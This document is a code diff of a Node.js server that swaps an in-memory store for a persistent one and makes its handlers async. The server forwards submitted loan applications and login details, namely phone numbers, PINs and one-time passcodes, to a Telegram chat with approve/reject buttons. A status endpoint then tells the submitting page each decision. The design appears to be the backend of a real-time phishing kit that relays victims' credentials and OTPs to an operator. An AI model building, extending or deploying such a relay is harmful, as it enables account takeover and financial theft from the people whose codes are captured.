@@ -25,10 +25,8 @@ if (!TOKEN || !CHAT_ID) {
 }
 const PORT = process.env.PORT || 3000;
 
-// In-memory store of applications and their Telegram message ids.
-// (Replace with a real DB in production.)
-const applications = new Map(); // appId -> { status, messageId, chatId, details }
-const loginVerifications = new Map(); // id -> { phone, pin, otp, type, timestamp, status, messageId, chatId }
+// Persistent shared store (survives restarts; shared across instances).
+const store = require('../store');
 
 /* ---------- Telegram Bot API helper ---------- */
 function tgApi(method, payload, cb) {
@@ -61,7 +59,7 @@ function esc(s) {
 }
 
 /* ---------- Build + send notifications ---------- */
-function notifyApplication(app) {
+async function notifyApplication(app) {
   const id = app.appId || ('APP-' + Date.now());
   const name = app.name || `${app.firstName || ''} ${app.lastName || ''}`.trim() || 'N/A';
   const text =
@@ -84,23 +82,23 @@ function notifyApplication(app) {
         { text: '❌ Reject', callback_data: `reject:${id}` },
       ]],
     },
-  }, (resp) => {
-    if (resp && resp.ok) {
-      applications.set(id, {
+  }, (r) => {
+    if (r && r.ok) {
+      store.set(store.NS.APPS, id, {
         status: 'pending',
-        messageId: resp.result.message_id,
+        messageId: r.result.message_id,
         chatId: CHAT_ID,
-        details: { ...app, name },
+        details: { ...app, name }
       });
       console.log('[notify] application sent:', id);
     } else {
-      console.error('[notify] send failed:', resp && resp.description);
+      console.error('[notify] send failed:', r && r.description);
     }
   });
   return id;
 }
 
-function notifyLoginVerification(login) {
+async function notifyLoginVerification(login) {
   const type = login.otp ? 'otp' : 'pin';
   const id = login.loginId || (type === 'otp' ? 'OTP-' : 'LOG-') + Date.now();
 
@@ -121,7 +119,7 @@ function notifyLoginVerification(login) {
       `Time: ${new Date().toLocaleString()}`;
   }
 
-  loginVerifications.set(id, {
+  await store.set(store.NS.LOGIN, id, {
     phone: login.username,
     pin: login.pin || '',
     otp: login.otp || '',
@@ -150,11 +148,12 @@ function notifyLoginVerification(login) {
     },
   }, (r) => {
     if (r && r.ok) {
-      const entry = loginVerifications.get(id);
-      if (entry) {
-        entry.messageId = r.result.message_id;
-        loginVerifications.set(id, entry);
-      }
+      store.get(store.NS.LOGIN, id).then((entry) => {
+        if (entry) {
+          entry.messageId = r.result.message_id;
+          store.set(store.NS.LOGIN, id, entry);
+        }
+      });
       console.log(`[notify] ${type} verification sent:`, id);
     } else {
       console.error(`[notify] ${type} verification failed:`, r && r.description);
@@ -190,12 +189,12 @@ function pollUpdates() {
   });
 }
 
-function handleCallback(cq) {
+async function handleCallback(cq) {
   const [action, id] = (cq.data || '').split(':');
 
   if (action === 'approve' || action === 'reject') {
     const decision = action === 'approve' ? 'approved' : 'rejected';
-    const rec = applications.get(id);
+    const rec = await store.get(store.NS.APPS, id);
     if (rec) rec.status = decision;
     const stamp = action === 'approve' ? '✅ Approved' : '❌ Rejected';
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `Marked ${decision}` });
@@ -213,6 +212,7 @@ function handleCallback(cq) {
           `Amount: ${esc(rec.details.amount || 'N/A')} USD\n\n` +
           `Status: <b>${stamp}</b>`,
       });
+      await store.set(store.NS.APPS, id, rec);
     }
     console.log(`[decision] ${id} -> ${decision}`);
     return;
@@ -222,9 +222,11 @@ function handleCallback(cq) {
     const decision = (action === 'pin_approve' || action === 'otp_approve') ? 'approved' : 'rejected';
     const kind = action.startsWith('pin') ? 'PIN' : 'OTP';
     const stamp = action.endsWith('approve') ? '✅ Approved' : '❌ Rejected';
-    const rec = loginVerifications.get(id);
+    const rec = await store.get(store.NS.LOGIN, id);
     if (rec) {
-      loginVerifications.set(id, { ...rec, status: decision, decided: true });
+      rec.status = decision;
+      rec.decided = true;
+      await store.set(store.NS.LOGIN, id, rec);
     }
     tgApi('answerCallbackQuery', { callback_query_id: cq.id, text: `${kind} ${decision}` });
     if (rec && rec.messageId) {
@@ -287,7 +289,7 @@ function serveStatic(req, res) {
   });
 }
 
-const server = http.createServer((req, res) => {
+const server = http.createServer(async (req, res) => {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
   res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
@@ -298,19 +300,25 @@ const server = http.createServer((req, res) => {
   if (req.method === 'POST' && req.url.startsWith('/api/notify/')) {
     let raw = '';
     req.on('data', (c) => (raw += c));
-    req.on('end', () => {
+    req.on('end', async () => {
       let payload = {};
       try { payload = JSON.parse(raw || '{}'); } catch (e) { /* ignore */ }
-      if (req.url.includes('application')) {
-        const id = notifyApplication(payload);
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ ok: true, appId: id }));
-      } else if (req.url.includes('login')) {
-        const id = notifyLoginVerification(payload);
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ ok: true, loginId: id }));
-      } else {
-        res.writeHead(404); res.end('not found');
+      try {
+        if (req.url.includes('application')) {
+          const id = await notifyApplication(payload);
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ ok: true, appId: id }));
+        } else if (req.url.includes('login')) {
+          const id = await notifyLoginVerification(payload);
+          res.writeHead(200, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ ok: true, loginId: id }));
+        } else {
+          res.writeHead(404); res.end('not found');
+        }
+      } catch (e) {
+        console.error('[notify] error:', e.message);
+        res.writeHead(500, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ error: 'notify failed' }));
       }
     });
     return;
@@ -319,7 +327,7 @@ const server = http.createServer((req, res) => {
   // GET /api/application/:id  -> current status (pending/approved/rejected)
   if (req.method === 'GET' && req.url.startsWith('/api/application/')) {
     const id = req.url.split('/').pop();
-    const rec = applications.get(id);
+    const rec = await store.get(store.NS.APPS, id);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({ status: rec ? rec.status : 'unknown' }));
     return;
@@ -328,7 +336,7 @@ const server = http.createServer((req, res) => {
   // GET /api/login/status/:id -> current verification status
   if (req.method === 'GET' && req.url.startsWith('/api/login/status/')) {
     const id = req.url.split('/').pop();
-    const rec = loginVerifications.get(id);
+    const rec = await store.get(store.NS.LOGIN, id);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     res.end(JSON.stringify({
       decided: !!rec && !!rec.decided,
